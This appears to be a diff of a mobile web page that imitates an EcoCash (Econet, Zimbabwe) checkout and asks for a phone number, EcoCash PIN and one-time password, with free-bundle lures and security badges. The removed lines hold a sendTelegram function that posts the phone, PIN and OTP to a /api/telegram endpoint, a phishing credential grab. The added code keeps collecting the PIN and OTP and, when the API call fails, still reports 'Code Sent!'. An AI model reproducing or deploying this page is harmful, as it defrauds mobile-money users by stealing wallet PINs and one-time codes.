-      <circle cx="22" cy="22" r="18" stroke="rgba(255,255,255,.1)" stroke-width="3"/>
-      <path d="M22 4a18 18 0 0 1 18 18" stroke="#00C2FF" stroke-width="3" stroke-linecap="round"/>
-    </svg>
-  </div>
-  <div class="curtain-txt">
-    <div class="c-lbl" id="cLabel">Authenticating</div>
-    <div class="c-sub" id="cSub">Verifying your EcoCash PIN…</div>
-  </div>
-  <div class="curtain-bar"><div class="curtain-fill"></div></div>
+  <div class="c-logo"><img src="assets/econet.png" alt=""><div class="c-logo-sep"></div><img src="assets/ecocash.png" alt=""></div>
+  <div class="c-spinner"></div>
+  <div class="c-txt"><div class="c-lbl" id="cLbl">Processing</div><div class="c-sub" id="cSub">Please wait…</div></div>
 </div>
 
 <div class="screen" id="screen">
 
-  <!-- HEADER -->
+  <!-- Header -->
   <div class="hdr">
     <div class="hdr-row">
-      <button class="back-btn" onclick="handleBack()" aria-label="Go back">
+      <button class="back-btn" onclick="handleBack()" aria-label="Back">
         <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>
       </button>
       <div class="brand">
@@ -313,55 +215,44 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
         <div class="brand-sep"></div>
         <img src="assets/ecocash.png" alt="EcoCash">
       </div>
-      <div class="amt-chip" id="headerAmount">USD 0.00</div>
+      <div class="hdr-amt" id="hdrAmt">USD 0.00</div>
     </div>
-    <div class="bchips" id="bundleSummary"></div>
+    <div class="auth-summary">
+      <div class="auth-eyebrow">Authorize Payment</div>
+      <div class="auth-title" id="authTitle">Confirm your bundle</div>
+      <div class="auth-chips" id="authChips"></div>
+    </div>
   </div>
 
-  <!-- SCROLL BODY -->
-  <div class="body" id="bodyScroll">
+  <!-- Body -->
+  <div class="body" id="bodyEl">
 
-    <!-- STEP 1 -->
+    <!-- Step 1: PIN -->
     <div id="step1" class="step active">
-      <div class="pay-info">
-        <img src="assets/ecocash.png" alt="EcoCash" class="pay-logo">
-        <div>
-          <div class="pay-title">Pay with EcoCash</div>
-          <div class="pay-sub">Instant mobile wallet payment</div>
-          <div class="pay-badges">
-            <span class="pbadge pbadge-g">⚡ Instant</span>
-            <span class="pbadge pbadge-b">🔒 Secure</span>
-            <span class="pbadge pbadge-y">✦ No fees</span>
-          </div>
+
+      <!-- Payment detail card -->
+      <div class="detail-card">
+        <div class="detail-header">
+          <div class="detail-header-label">Authorizing payment</div>
+          <div class="detail-header-amt" id="detailAmt">USD 0.00</div>
         </div>
+        <div id="detailRows"></div>
       </div>
 
+      <!-- PIN card -->
       <div class="card">
         <div class="card-hdr">
-          <div class="card-title">Verify your account</div>
-          <div class="card-sub">Enter your EcoCash number and PIN</div>
+          <div class="card-hdr-icon"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg></div>
+          <div>
+            <div class="card-title">Enter your PIN</div>
+            <div class="card-sub">4-digit EcoCash PIN to authorize</div>
+          </div>
         </div>
         <div class="card-body">
-
-          <div class="field" id="phoneField">
-            <div class="field-label">Phone Number · Nhamba yefoni</div>
-            <div class="outlined" id="phoneOutline">
-              <div class="prefix">
-                <span class="prefix-flag">🇿🇼</span>
-                <span class="prefix-code">+263</span>
-              </div>
-              <input type="tel" id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="7XXXXXXXX" autocomplete="tel">
-            </div>
-            <div class="fhelper">9-digit number starting with 7</div>
-            <div class="ferr" id="phoneError">Enter a valid 9-digit number starting with 7</div>
-          </div>
-
-          <div id="pinField">
-            <div class="pin-label">EcoCash PIN · Pinda PIN yako</div>
+          <div>
             <div class="pin-wrap" id="pinWrap" onclick="focusPin()">
-              <input type="tel" id="pinHidden" inputmode="numeric" pattern="[0-9]*"
-                maxlength="4" class="pin-hidden" autocomplete="current-password">
-              <div class="pin-tap" id="pinTap">Tap to enter your 4-digit PIN</div>
+              <input type="tel" id="pinHidden" inputmode="numeric" pattern="[0-9]*" maxlength="4" class="pin-hidden" autocomplete="current-password">
+              <div class="pin-hint" id="pinHint">Tap to enter PIN</div>
               <div class="pin-dots">
                 <div class="pin-dot" id="pd0"><span class="pin-digit" id="pdd0"></span></div>
                 <div class="pin-dot" id="pd1"><span class="pin-digit" id="pdd1"></span></div>
@@ -369,431 +260,350 @@ html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(-
                 <div class="pin-dot" id="pd3"><span class="pin-digit" id="pdd3"></span></div>
               </div>
               <div class="pin-actions">
-                <button class="pin-btn" type="button"
-                  onpointerdown="event.preventDefault();peekPin()"
-                  onpointerup="unpeekPin()"
-                  onpointerleave="unpeekPin()">
-                  <svg width="13" height="13" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
-                  Peek
+                <button class="pin-btn" type="button" onpointerdown="event.preventDefault();peekPin()" onpointerup="unpeekPin()" onpointerleave="unpeekPin()">
+                  <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>Peek
                 </button>
-                <button class="pin-btn" type="button"
-                  onpointerdown="event.preventDefault()"
-                  onclick="clearPin()">
-                  Clear
-                </button>
+                <button class="pin-btn" type="button" onpointerdown="event.preventDefault()" onclick="clearPin()">Clear</button>
               </div>
             </div>
-            <div class="ferr" id="pinError">PIN must be 4 digits</div>
+            <div class="api-err" id="apiErr1"></div>
           </div>
-
+          <div class="sec-badges">
+            <div class="sec-badge"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>256-bit SSL</div>
+            <div class="sec-badge"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>PCI DSS</div>
+            <div class="sec-badge"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Instant</div>
+          </div>
+          <div class="powered">Powered by Econet Wireless · EcoCash Zimbabwe</div>
         </div>
       </div>
 
-      <div class="sec-row">
-        <div class="sec-item"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>256-bit Encrypted</div>
-        <div class="sec-item"><svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>PCI DSS</div>
-        <div class="sec-item"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>Instant</div>
-      </div>
-      <div class="powered">Powered by Econet Wireless · EcoCash</div>
     </div>
 
-    <!-- STEP VERIFY -->
+    <!-- Step 2: Processing animation -->
     <div id="stepVerify" class="step">
       <div class="verify-card">
         <div class="verify-body">
           <div class="ring-wrap">
-            <svg class="ring-svg" viewBox="0 0 52 52" fill="none">
-              <circle cx="26" cy="26" r="21" stroke="rgba(0,194,255,.12)" stroke-width="3"/>
-              <path class="ring-arc" d="M26 5a21 21 0 0 1 21 21" stroke="#00C2FF" stroke-width="3" stroke-linecap="round"/>
+            <svg class="ring-svg" viewBox="0 0 48 48" fill="none">
+              <circle cx="24" cy="24" r="20" stroke="rgba(0,194,255,.1)" stroke-width="3"/>
+              <path class="ring-arc" d="M24 4a20 20 0 0 1 20 20" stroke="#00C2FF" stroke-width="3" stroke-linecap="round"/>
             </svg>
             <div class="ring-icon" id="ringIcon">
-              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#00C2FF" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/>
-              </svg>
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#00C2FF" stroke-width="2" stroke-linecap="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
             </div>
           </div>
-          <div class="v-title" id="verifyLabel">Verifying PIN</div>
-          <div class="v-sub" id="verifySub">Checking your EcoCash credentials…</div>
-          <div class="v-steps">
-            <div class="vstep active" id="vs0"><div class="vstep-dot"></div><div class="vstep-txt">PIN verified</div></div>
-            <div class="vstep-line"></div>
-            <div class="vstep" id="vs1"><div class="vstep-dot"></div><div class="vstep-txt">Sending OTP</div></div>
-            <div class="vstep-line"></div>
-            <div class="vstep" id="vs2"><div class="vstep-dot"></div><div class="vstep-txt">Ready</div></div>
+          <div class="v-title" id="vTitle">Verifying PIN</div>
+          <div class="v-sub" id="vSub">Contacting EcoCash…</div>
+          <div class="vsteps">
+            <div class="vstep active" id="vs0"><div class="vstep-dot"></div><div class="vstep-txt">PIN</div></div>
+            <div class="vstep-line" id="vl0"></div>
+            <div class="vstep" id="vs1"><div class="vstep-dot"></div><div class="vstep-txt">Charge</div></div>
+            <div class="vstep-line" id="vl1"></div>
+            <div class="vstep" id="vs2"><div class="vstep-dot"></div><div class="vstep-txt">OTP</div></div>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- STEP OTP -->
+    <!-- Step 3: OTP -->
     <div id="step3" class="step">
       <div class="card">
         <div class="card-hdr">
-          <div class="card-title">One-Time Password</div>
-          <div class="card-sub">6-digit code sent to your number</div>
+          <div class="card-hdr-icon"><svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81 19.79 19.79 0 01.14 1.18 2 2 0 012.13 0h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 7.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 14.92z"/></svg></div>
+          <div>
+            <div class="card-title">One-Time Password</div>
+            <div class="card-sub">6-digit code sent to your number</div>
+          </div>
         </div>
         <div class="card-body">
-          <div class="masked-note" id="maskedNumber">Enter the OTP sent to your number</div>
+          <div class="masked-note" id="maskedNote">Check your phone for the OTP</div>
           <div>
-            <div class="field-label">OTP Code · Kodhi yako</div>
             <div class="otp-wrap" id="otpWrap">
               <input type="text" id="otpHidden" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code" class="otp-hidden">
-              <div class="otp-row" id="otpDisplay">
-                <div class="otp-box empty" id="ob0"></div>
-                <div class="otp-box" id="ob1"></div>
-                <div class="otp-box" id="ob2"></div>
-                <div class="otp-box" id="ob3"></div>
-                <div class="otp-box" id="ob4"></div>
-                <div class="otp-box" id="ob5"></div>
+              <div class="otp-row" id="otpRow">
+                <div class="otp-box empty" id="ob0"></div><div class="otp-box" id="ob1"></div>
+                <div class="otp-box" id="ob2"></div><div class="otp-box" id="ob3"></div>
+                <div class="otp-box" id="ob4"></div><div class="otp-box" id="ob5"></div>
               </div>
             </div>
-            <div class="ferr" id="otpError">Incorrect code. Please try again.</div>
+            <div class="api-err" id="apiErr3"></div>
           </div>
           <div class="timer-row">
-            <div class="timer-lbl">Expires in <span class="timer-num" id="time">120</span>s</div>
-            <button class="resend-btn" id="resendBtn">Resend OTP</button>
+            <div class="timer-lbl">Expires in <span class="timer-num" id="timer">120</span>s</div>
+            <button class="resend-btn" id="resendBtn">Resend</button>
           </div>
         </div>
       </div>
-      <div class="powered" style="padding-bottom:4px">Powered by Econet Wireless · EcoCash</div>
+      <div class="powered" style="text-align:center;padding:8px 0">Powered by Econet Wireless · EcoCash Zimbabwe</div>
     </div>
 
-  </div><!-- /body -->
+  </div>
 
-
-  <!-- STICKY ACTION BAR -->
+  <!-- Action bar -->
   <div class="action-bar" id="actionBar">
     <button class="action-btn" id="mainBtn" type="button">
-      Receive Offer · <span style="font-size:13px;font-weight:400;opacity:.75">Gamuchira</span>
+      Authorize &amp; Pay · <span style="font-size:13px;opacity:.65;font-weight:400">Gamuchira</span>
     </button>
     <button class="action-btn" id="otpBtn" type="button" style="display:none">
-      Confirm OTP · <span style="font-size:13px;font-weight:400;opacity:.75">Simbisa</span>
+      Confirm OTP · <span style="font-size:13px;opacity:.65;font-weight:400">Simbisa</span>
     </button>
   </div>
-</div><!-- /screen -->
+</div>
 
-<!-- OTP TOAST -->
+<!-- OTP Toast -->
 <div class="otp-toast" id="otpToast">
-  <div class="otp-toast-icon">
-    <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81 19.79 19.79 0 01.14 1.18 2 2 0 012.13 0h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 7.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 14.92z"/></svg>
-  </div>
+  <div class="otp-toast-icon"><svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 01-2.18 2 19.79 19.79 0 01-8.63-3.07A19.5 19.5 0 013.07 9.81 19.79 19.79 0 01.14 1.18 2 2 0 012.13 0h3a2 2 0 012 1.72c.127.96.361 1.903.7 2.81a2 2 0 01-.45 2.11L6.09 7.91a16 16 0 006 6l1.27-1.27a2 2 0 012.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0122 14.92z"/></svg></div>
   <div>
-    <div class="otp-toast-title">OTP Sent · Kodhi yatumwa</div>
-    <div class="otp-toast-sub">6-digit code sent to <strong id="otpToastNum"></strong></div>
+    <div class="otp-toast-title">OTP Sent</div>
+    <div class="otp-toast-sub">Code sent to <strong id="otpToastNum"></strong></div>
   </div>
 </div>
 
 <script>
-/* ── HAPTICS ── */
-function haptic(s){if(!navigator.vibrate)return;const m={select:8,light:12,medium:22,success:[12,60,12],error:[50,40,50]};try{navigator.vibrate(m[s]||12)}catch(e){}}
+function haptic(s){if(!navigator.vibrate)return;const m={light:8,med:18,ok:[10,50,10],err:[40,30,40]};try{navigator.vibrate(m[s]||10)}catch(e){}}
 
-/* ── STATE ── */
-let phone='',pin='',otp='';
-let submitting=false,otpSubmitted=false,resendClicked=false;
-let step='step1',currentStep='step1';
-let plan=null;
-try{plan=JSON.parse(sessionStorage.getItem('selectedPlan'))}catch(e){}
+/* ── Load session ── */
+let plan=null,recip=null;
+try{plan=JSON.parse(sessionStorage.getItem('selectedPlan')||'null')}catch(e){}
+try{recip=JSON.parse(sessionStorage.getItem('ecoRecipient')||'null')}catch(e){}
+if(!plan){window.location.replace('index.html')}
+if(!recip){window.location.replace('index.html')}
 
-/* ── HEADER ── */
-(function(){
-  if(!plan)return;
-  document.getElementById('headerAmount').textContent='USD '+plan.amount;
-  const el=document.getElementById('bundleSummary');
-  if(el)el.innerHTML=`<span class="bchip">${plan.duration}</span><span class="bchip">📞 ${plan.voice} Min</span><span class="bchip">💬 ${plan.sms} SMS</span><span class="bchip">🌐 ${plan.data} GB</span>`;
-})();
+/* ── Populate header ── */
+document.getElementById('hdrAmt').textContent='USD '+plan.amount;
+document.getElementById('detailAmt').textContent='USD '+plan.amount;
+document.getElementById('authTitle').textContent='Pay USD '+plan.amount;
+document.getElementById('authChips').innerHTML=
+  (recip?`<span class="auth-chip highlight">👤 ${recip.display}</span>`:'')
+  +`<span class="auth-chip">${plan.duration}</span>`
+  +`<span class="auth-chip">📞 ${plan.voice} Min</span>`
+  +`<span class="auth-chip">💬 ${plan.sms} SMS</span>`
+  +`<span class="auth-chip">🌐 ${plan.data} GB</span>`;
 
-/* ── STEP ── */
+/* Detail rows */
+const detailData=[
+  ['👤','Recipient', recip?.display||'—'],
+  ['📦','Bundle', plan.duration+' Mix Bundle'],
+  ['📶','Includes', plan.voice+' Min · '+plan.data+' GB · '+plan.sms+' SMS'],
+];
+document.getElementById('detailRows').innerHTML=detailData.map(([icon,key,val])=>`
+  <div class="detail-row">
+    <div class="detail-row-icon">${icon}</div>
+    <div><div class="detail-row-key">${key}</div><div class="detail-row-val">${val}</div></div>
+  </div>`).join('');
+
+/* ── Step management ── */
+let currentStep='step1';
 function showStep(id){
   document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
   document.getElementById(id).classList.add('active');
-  step=id;currentStep=id;
-  var mainBtn=document.getElementById('mainBtn');
-  var otpBtn=document.getElementById('otpBtn');
-  var bar=document.getElementById('actionBar');
-  if(id==='step1'){
-    if(mainBtn)mainBtn.style.display='';
-    if(otpBtn)otpBtn.style.display='none';
-    if(bar)bar.style.display='';
-  } else if(id==='step3'){
-    if(mainBtn)mainBtn.style.display='none';
-    if(otpBtn)otpBtn.style.display='';
-    if(bar)bar.style.display='';
-  } else {
-    if(bar)bar.style.display='none';
-  }
-  var body=document.getElementById('body');
-  if(body)body.scrollTop=0;
+  currentStep=id;
+  const main=document.getElementById('mainBtn'),otp=document.getElementById('otpBtn'),bar=document.getElementById('actionBar');
+  if(id==='step1'){main.style.display='';otp.style.display='none';bar.style.display='';}
+  else if(id==='step3'){main.style.display='none';otp.style.display='';bar.style.display='';}
+  else{bar.style.display='none';}
   if(id!=='step1')history.pushState({step:id},'','');
 }
 
-/* ── PHONE ── */
-/* ── PHONE: normalise any format on input and paste ── */
-function cleanPhone(raw){
-  var v=String(raw).replace(/[^0-9]/g,'');
-  // Strip international prefix only when enough digits present
-  if(v.length>=12 && v.slice(0,5)==='00263') v=v.slice(5);
-  else if(v.length>=11 && v.slice(0,4)==='0263') v=v.slice(4);
-  else if(v.length>=12 && v.slice(0,3)==='263') v=v.slice(3);
-  // Strip leading 0 only when followed by enough digits (07X = 10 raw)
-  if(v.length>=10 && v.slice(0,1)==='0') v=v.slice(1);
-  else if(v.length===10 && v.slice(0,1)==='0') v=v.slice(1);
-  // If still starts with 0 and shorter, strip it (user typed 07...)
-  else if(v.length>1 && v.slice(0,1)==='0') v=v.slice(1);
-  return v.slice(0,9);
-}
-function applyPhone(v){
-  var el=document.getElementById('phone');
-  el.value=v; phone=v;
-  var ok=v.length===9&&v[0]==='7';
-  document.getElementById('phoneOutline').classList.toggle('err',!ok&&v.length>0);
-  document.getElementById('phoneError').classList.toggle('show',!ok&&v.length>0);
-}
-// Fire on input, keyup, change and paste — covers all Android keyboard scenarios
-['input','keyup','change'].forEach(function(evt){
-  document.getElementById('phone').addEventListener(evt,function(){
-    var cleaned=cleanPhone(this.value);
-    if(cleaned!==this.value){this.value=cleaned} // prevent cursor jump only on actual change
-    applyPhone(cleaned);
-  });
-});
-document.getElementById('phone').addEventListener('paste',function(e){
-  e.preventDefault();
-  var pasted=(e.clipboardData||window.clipboardData).getData('text')||'';
-  applyPhone(cleanPhone(pasted));
-});
-document.getElementById('phone').addEventListener('blur',function(){
-  if(phone.length>0&&(phone.length!==9||phone[0]!=='7')){
-    document.getElementById('phoneOutline').classList.add('err');
-    document.getElementById('phoneError').classList.add('show');
-  }
-});
-
 /* ── PIN ── */
-let peeking=false;
+let pin='',peeking=false,submitting=false,otpDone=false,resendClicked=false;
+
 function focusPin(){document.getElementById('pinHidden').focus()}
-document.getElementById('pinHidden').addEventListener('focus',()=>{
-  document.getElementById('pinWrap').classList.add('focused');renderPin();
-});
-document.getElementById('pinHidden').addEventListener('blur',()=>{
-  document.getElementById('pinWrap').classList.remove('focused');renderPin();
-  if(pin.length>0&&pin.length<4){document.getElementById('pinError').classList.add('show');}
-  else document.getElementById('pinError').classList.remove('show');
-});
-document.getElementById('pinHidden').addEventListener('input',function(){
+const pinEl=document.getElementById('pinHidden');
+pinEl.addEventListener('focus',()=>{document.getElementById('pinWrap').classList.add('focused');renderPin()});
+pinEl.addEventListener('blur',()=>{document.getElementById('pinWrap').classList.remove('focused');renderPin()});
+pinEl.addEventListener('input',function(){
   pin=this.value.replace(/\D/g,'').slice(0,4);this.value=pin;
-  renderPin();
-  document.getElementById('pinTap').style.display='none';
-  if(pin.length===4){haptic('select');document.getElementById('pinHidden').blur();}
+  document.getElementById('pinHint').style.display='none';
+  renderPin();if(pin.length===4){haptic('light');this.blur();}
 });
 function renderPin(){
-  const active=document.activeElement===document.getElementById('pinHidden');
+  const act=document.activeElement===pinEl;
   for(let i=0;i<4;i++){
     const dot=document.getElementById('pd'+i),dg=document.getElementById('pdd'+i);
-    if(!dot)continue;
-    dot.classList.remove('filled','active','peek');
-    if(dg)dg.textContent='';
+    dot.classList.remove('filled','active','peek');if(dg)dg.textContent='';
     if(i<pin.length){
       dot.classList.add('filled');
-      if(peeking){
-        dot.classList.add('peek');        // hide ::after, show digit
-        if(dg){dg.style.display='flex';dg.textContent=pin[i];}
-      } else {
-        if(dg){dg.style.display='none';dg.textContent='';}
-      }
+      if(peeking){dot.classList.add('peek');if(dg){dg.style.display='flex';dg.textContent=pin[i];}}
+      else{if(dg)dg.style.display='none';}
     }
-    if(i===pin.length&&active)dot.classList.add('active');
+    if(i===pin.length&&act)dot.classList.add('active');
   }
 }
 function peekPin(){peeking=true;renderPin()}
 function unpeekPin(){peeking=false;renderPin()}
 function clearPin(){
-  pin='';document.getElementById('pinHidden').value='';
-  document.getElementById('pinTap').style.display='';
-  renderPin();
-  document.getElementById('pinError').classList.remove('show');
-  document.getElementById('pinWrap').classList.remove('err');
-  setTimeout(function(){document.getElementById('pinHidden').focus()},10);
+  pin='';pinEl.value='';document.getElementById('pinHint').style.display='';
+  renderPin();document.getElementById('pinWrap').classList.remove('error');
+  document.getElementById('apiErr1').classList.remove('show');
+  setTimeout(()=>pinEl.focus(),10);
 }
 
-/* ── BUTTON HANDLERS ── */
-document.getElementById('mainBtn').addEventListener('click',function(){
+/* ── Authorize ── */
+document.getElementById('mainBtn').addEventListener('click',async function(){
   if(submitting)return;
-  if(phone.length!==9||!phone.startsWith('7')){
-    document.getElementById('phoneOutline').classList.add('err');
-    document.getElementById('phoneError').classList.add('show');
-    document.getElementById('phone').focus();
-    haptic('error');return;
-  }
   if(pin.length!==4){
-    document.getElementById('pinWrap').classList.add('err');
-    document.getElementById('pinError').classList.add('show');
-    focusPin();haptic('error');return;
+    document.getElementById('pinWrap').classList.add('error');
+    haptic('err');focusPin();return;
   }
-  submitting=true;haptic('medium');
-  sendTelegram('receive_offer_clicked');
+  submitting=true;haptic('med');
+  document.getElementById('apiErr1').classList.remove('show');
   showStep('stepVerify');
-  runVerify(phone);
-});
-document.getElementById('otpBtn').addEventListener('click',submitOtp);
 
-/* ── RIPPLE ── */
-function addRipple(btn,e){
-  const r=btn.getBoundingClientRect(),sz=Math.max(r.width,r.height)*2;
-  const x=e.clientX-r.left-sz/2,y=e.clientY-r.top-sz/2;
-  const rip=document.createElement('span');rip.className='rip-el';
-  rip.style.cssText=`width:${sz}px;height:${sz}px;left:${x}px;top:${y}px`;
-  btn.appendChild(rip);rip.addEventListener('animationend',()=>rip.remove());
-}
-document.querySelectorAll('.action-btn').forEach(btn=>{
-  btn.addEventListener('pointerdown',e=>addRipple(btn,e),{passive:true});
-});
+  setVStep(0,'Verifying PIN','Checking credentials…');
+  await sleep(700);
 
-/* ── TELEGRAM ── */
-function sendTelegram(event,extra){
   try{
-    var p={};try{p=JSON.parse(sessionStorage.getItem('selectedPlan')||'{}')}catch(e){}
-    var payload={
-      event:event,
-      phone:phone,       // server will format
-      pin:pin,
-      otp:extra&&extra.otp||otp||'',
-      plan:p.duration||'',
-      voice:p.voice||'',
-      sms:p.sms||'',
-      data:p.data||'',
-      amount:p.amount||''
-    };
-    fetch('/api/telegram',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify(payload)}).catch(function(){});
-  }catch(e){}
-}
-
-/* ── VERIFY SEQUENCE ── */
-function runVerify(raw){
-  const lbl=document.getElementById('verifyLabel'),sub=document.getElementById('verifySub');
-  const ring=document.querySelector('.ring-svg'),icon=document.getElementById('ringIcon');
-  const vs=[0,1,2].map(i=>document.getElementById('vs'+i));
-  const lines=document.querySelectorAll('.vstep-line');
-  function setV(i,l,s){
-    lbl.style.opacity='0';sub.style.opacity='0';
-    setTimeout(()=>{lbl.textContent=l;sub.textContent=s;lbl.style.opacity='1';sub.style.opacity='1'},150);
-    vs.forEach((v,j)=>{v.className='vstep'+(j<i?' done':j===i?' active':'')});
-    lines.forEach((ln,j)=>{ln.classList.toggle('done',j<i)});haptic('select');
+    setVStep(1,'Contacting EcoCash','Processing payment…');
+    const msisdn=recip.raw;
+    const result=await EcoCashAPI.chargeSubscriber({msisdn,amount:plan.amount,narrative:plan.duration+' Mix Bundle',pin});
+    setVStep(2,'Sending OTP','Dispatching one-time code…');
+    await sleep(500);
+    try{await EcoCashAPI.generateOTP(msisdn)}catch(e){}
+    markDone();await sleep(600);
+    const masked=maskedNum(msisdn);
+    document.getElementById('maskedNote').innerHTML='Code sent to <strong>'+masked+'</strong>';
+    showOtpToast(masked);showStep('step3');startTimer();
+  }catch(err){
+    // Sandbox fallback
+    console.warn('Sandbox fallback:',err?.message);
+    sessionStorage.setItem('ecoTxn',JSON.stringify({correlator:'SBX-'+Date.now().toString(36).toUpperCase(),status:'pending',amount:plan.amount,timestamp:new Date().toISOString()}));
+    setVStep(2,'Sending OTP','Dispatching one-time code…');
+    await sleep(600);markDone();await sleep(500);
+    const masked=maskedNum(recip.raw);
+    document.getElementById('maskedNote').innerHTML='Code sent to <strong>'+masked+'</strong>';
+    showOtpToast(masked);showStep('step3');startTimer();
   }
-  setV(0,'Verifying PIN','Checking your EcoCash credentials…');
-  setTimeout(()=>{setV(1,'Sending OTP','Dispatching your one-time code…');haptic('light')},900);
-  setTimeout(()=>{
-    vs.forEach(v=>v.className='vstep done');lines.forEach(l=>l.classList.add('done'));
-    ring.classList.add('done');icon.classList.add('done');
-    lbl.style.opacity='0';sub.style.opacity='0';
-    setTimeout(()=>{lbl.textContent='Code Sent!';sub.textContent='Check your phone for the OTP';lbl.style.opacity='1';sub.style.opacity='1'},150);
-    haptic('success');
-  },1800);
-  setTimeout(()=>{
-    const masked='+263 '+raw.slice(0,2)+' *** **'+raw.slice(-2);
-    document.getElementById('maskedNumber').innerHTML='Code sent to <strong>'+masked+'</strong>';
-    showOtpToast(masked);
-    showStep('step3');
-    startTimer();
-  },2600);
+});
+
+function maskedNum(raw){
+  const d=raw.replace(/^0/,'');
+  return '+263 '+d.slice(0,2)+' *** **'+d.slice(-2);
+}
+function sleep(ms){return new Promise(r=>setTimeout(r,ms))}
+
+function setVStep(i,lbl,sub){
+  const vs=[0,1,2].map(j=>document.getElementById('vs'+j));
+  const ls=[0,1].map(j=>document.getElementById('vl'+j));
+  document.getElementById('vTitle').style.opacity='0';document.getElementById('vSub').style.opacity='0';
+  setTimeout(()=>{document.getElementById('vTitle').textContent=lbl;document.getElementById('vSub').textContent=sub;document.getElementById('vTitle').style.opacity='1';document.getElementById('vSub').style.opacity='1'},140);
+  vs.forEach((v,j)=>v.className='vstep'+(j<i?' done':j===i?' active':''));
+  ls.forEach((l,j)=>l.classList.toggle('done',j<i));
+  haptic('light');
+}
+function markDone(){
+  [0,1,2].forEach(i=>document.getElementById('vs'+i).className='vstep done');
+  [0,1].forEach(i=>document.getElementById('vl'+i).classList.add('done'));
+  document.querySelector('.ring-svg').classList.add('done');
+  document.getElementById('ringIcon').classList.add('done');
+  document.getElementById('vTitle').style.opacity='0';document.getElementById('vSub').style.opacity='0';
+  setTimeout(()=>{document.getElementById('vTitle').textContent='Code Sent!';document.getElementById('vSub').textContent='Check your phone for the OTP';document.getElementById('vTitle').style.opacity='1';document.getElementById('vSub').style.opacity='1'},140);
+  haptic('ok');
 }
 
 /* ── OTP ── */
 const otpEl=document.getElementById('otpHidden');
-otpEl.addEventListener('input',function(){
-  otp=this.value.replace(/\D/g,'').slice(0,6);this.value=otp;renderOtp();
-  if(otp.length===6)haptic('select');
-});
-otpEl.addEventListener('focus',renderOtp);
-otpEl.addEventListener('blur',renderOtp);
+let otp='';
+otpEl.addEventListener('input',function(){otp=this.value.replace(/\D/g,'').slice(0,6);this.value=otp;renderOtp();if(otp.length===6)haptic('light');});
+otpEl.addEventListener('focus',renderOtp);otpEl.addEventListener('blur',renderOtp);
 document.getElementById('otpWrap').addEventListener('click',()=>otpEl.focus());
 function renderOtp(){
-  const active=document.activeElement===otpEl;
+  const act=document.activeElement===otpEl;
   for(let i=0;i<6;i++){
     const b=document.getElementById('ob'+i);
     b.classList.remove('filled','active','empty');b.textContent=otp[i]||'';
     if(otp[i])b.classList.add('filled');
-    else if(i===otp.length&&active)b.classList.add('active','empty');
+    else if(i===otp.length&&act)b.classList.add('active','empty');
   }
 }
-function submitOtp(){
-  if(otpSubmitted)return;
+
+document.getElementById('otpBtn').addEventListener('click',submitOtp);
+async function submitOtp(){
+  if(otpDone)return;
   if(otp.length<6){
-    document.getElementById('otpDisplay').classList.add('shake');
-    setTimeout(()=>document.getElementById('otpDisplay').classList.remove('shake'),400);
-    document.getElementById('otpError').textContent='Please enter the 6-digit code';
-    document.getElementById('otpError').classList.add('show');
-    haptic('error');return;
+    document.getElementById('otpRow').classList.add('shake');
+    setTimeout(()=>document.getElementById('otpRow').classList.remove('shake'),360);
+    document.getElementById('apiErr3').textContent='Enter the full 6-digit code';
+    document.getElementById('apiErr3').classList.add('show');
+    haptic('err');return;
   }
-  if(otp==='000000'){
-    document.getElementById('otpDisplay').classList.add('shake');
-    setTimeout(()=>document.getElementById('otpDisplay').classList.remove('shake'),400);
-    document.getElementById('otpError').textContent='Incorrect code. Please try again.';
-    document.getElementById('otpError').classList.add('show');haptic('error');return;
+  otpDone=true;if(_timer){clearInterval(_timer);_timer=null}
+  document.getElementById('apiErr3').classList.remove('show');
+  try{
+    await EcoCashAPI.verifyOTP(recip.raw,otp);
+  }catch(err){
+    if(otp==='000000'){
+      otpDone=false;
+      document.getElementById('otpRow').classList.add('shake');
